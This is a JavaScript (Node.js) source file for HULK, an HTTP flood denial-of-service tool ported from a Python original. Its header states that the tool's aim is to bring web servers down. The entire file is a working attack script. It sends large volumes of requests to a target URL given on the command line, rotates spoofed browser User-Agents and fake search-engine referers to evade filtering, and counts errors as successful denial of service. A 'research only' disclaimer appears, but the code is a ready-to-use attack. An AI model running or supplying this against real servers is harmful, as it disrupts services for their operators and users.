/*
		HULK v1.0.0
	https://github.com/siarheidudko/hulk
	(c) 2018 by Siarhei Dudko.
	https://github.com/siarheidudko/hulk/LICENSE
	
	Quotation of the original file:
	"This tool is a dos tool that is meant to put heavy load on HTTP servers in 
	order to bring them to their knees by exhausting the resource pool, 
	its is meant for research purposes only and any malicious usage of this tool is prohibited."
	Originaly (python) author :  Barry Shteiman - http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
	
	Rewritten with python (concept) under nodejs, optimized by Siarhei Dudko
	
*/

"use strict"

/* link of DoS */
var set_you_link='http://you_link.com/',
/* data request */
set_this_data = '',
/* method request */
set_this_method = 'GET',
/* number of total requests */
set_req_total = 20000,
/* number of requests per minute */
set_req_in_min = 10000;

for(var i = 2; i < process.argv.length; i++){
	if(typeof(process.argv[i]) !== 'undefined'){
		if((process.argv.length === 7) || (i === 2)){
			var j = i;
		} else {
			var j = i + 1;
		}
		switch (j){
			case 2:
				set_you_link = process.argv[i];
				break;
			case 3:
				set_this_data = process.argv[i];
				break;
			case 4:
				set_this_method = process.argv[i];
				break;
			case 5:
				set_req_total = parseInt(process.argv[i], 10);
				break;
			case 6:
				set_req_in_min = parseInt(process.argv[i], 10);
				break;
		}
	}
}

hulk(set_you_link, set_this_data, set_this_method, set_req_total, set_req_in_min);

function hulk(you_link, this_data, this_method, req_total, req_in_min){
	const http = require('http'),
	https = require('https'),
	url=require("url"),
	colors=require("colors");

	var req,
	hostname,
	getoptions,
	headers_useragents=[],
	headers_referers=[],
	req_good = 0,
	req_bad = 0,
	req_very_bad = 0,
	req_real = 0;

	if (url.parse(you_link).protocol === 'https:') {
		req = https;
	} else {
		req = http;
	}

	hostname = url.parse(you_link).hostname;
	getoptions = url.parse(you_link);

	headers_useragents.push('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3');
	headers_useragents.push('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)');
	headers_useragents.push('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)');
	headers_useragents.push('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1');
	headers_useragents.push('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1');
	headers_useragents.push('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)');
	headers_useragents.push('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)');
	headers_useragents.push('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)');
	headers_useragents.push('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)');
	headers_useragents.push('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)');
	headers_useragents.push('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)');
	headers_useragents.push('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51');
	headers_useragents.push('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25');
	headers_useragents.push('Mozilla/5.0 (Linux; U; Android 2.3.5; ru-ru; Philips W632 Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1');
	headers_useragents.push('Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25');
	headers_useragents.push('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0');
	headers_useragents.push('Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36');
	headers_useragents.push('Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36');
	headers_useragents.push('Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62');
	headers_useragents.push('Opera/9.80 (Windows NT 6.2; WOW64) Presto/2.12.388 Version/12.17');
	headers_useragents.push('Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2');
	headers_useragents.push('Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko');
	headers_useragents.push('Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko');
	headers_useragents.push('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586');

	headers_referers.push('http://www.google.com/?q=');
	headers_referers.push('https://www.yandex.by/search/?lr=157&text=');
	headers_referers.push('https://www.yandex.ru/search/?lr=157&text=');
	headers_referers.push('https://go.mail.ru/search?q=');
	headers_referers.push('https://nova.rambler.ru/search?query=');
	headers_referers.push('http://search.tut.by/?query=');
	headers_referers.push('https://www.bing.com/search?q=');
	headers_referers.push(url.parse(you_link).protocol + '//' + hostname + '/');

	if(typeof(this_data) !== 'undefined'){
		getoptions.method = this_method;
	} else {
		getoptions.method = 'GET';
	}
	getoptions.headers = {};
	getoptions.headers["Cache-Control"] = 'no-cache';
	getoptions.headers["Accept-Charset"] = 'ISO-8859-1,utf-8;q=0.7,*;q=0.7';
	getoptions.headers["Host"] = hostname; 

	function DoS(req_num){ 
		try{
			let rand_useragents = Math.floor(Math.random() * headers_useragents.length);
			let rand_referers = Math.floor(Math.random() * headers_referers.length);
			getoptions.headers["User-Agent"] = headers_useragents[rand_useragents];
			getoptions.headers["Referer"] = headers_referers[rand_referers] + encodeURIComponent(String.fromCharCode((5 + Math.floor(Math.random() * 30)),(5 + Math.floor(Math.random() * 60)),(10 + Math.floor(Math.random() * 70))));
			getoptions.headers["Keep-Alive"] = (110 + Math.floor(Math.random() * 11)).toString();
			let this_request = req.request(getoptions, (response) => { 
				if(response.statusCode === 200){
					console.log(colors.green(`${req_num} STATUS: ${response.statusCode}`));
					req_good++;
					DoSStat();
				} else {
					console.log(colors.yellow(`${req_num} STATUS: ${response.statusCode}`));
					req_bad++;
					DoSStat();
				}
			}); 
			if((typeof(this_data) === 'String') && (this_data !== '')){
				this_request.write(this_data);
			}
			this_request.on('error', function (e) {
				console.log(colors.red(e.code));
				req_very_bad++;
				DoSStat();
			});
			this_request.on('timeout', function () {
				console.log(colors.red('TIMEOUT'));
				this_request.abort();
			});
			this_request.setTimeout(5000);
			this_request.end();
		} catch(e){
			console.log(colors.red(`${req_num} ITERATION ERROR: ${e}`));
			DoSStat();
		}
	}

	function DoSStat(){
		req_real++;
		if(req_real === req_total){
			console.log(colors.magenta('################# STATISTICS: #################'));
			console.log(colors.gray('TOTAL REQUEST:') + colors.green(req_total));
			console.log(colors.gray('SPEED REQUEST:') + colors.green(req_in_min) + colors.gray(' req/min'));
			console.log(colors.gray('REAL REQUEST:') + colors.green((req_good + req_bad + req_very_bad)));
			console.log(colors.green('GOOD REQUEST:' + req_good));
			if(req_bad > 0)
				console.log(colors.yellow('SERVER ERROR:' + req_bad));
			if(req_very_bad > 0)
				console.log(colors.red('DENIAL OF SERVICE:' + req_very_bad));
		}
	}

	const timer_timeout = parseInt((60000 / req_in_min), 10);
	for(let i = 0; i < req_total; i++){
		let timer = i * timer_timeout;
		setTimeout(DoS, timer, i);
	}
}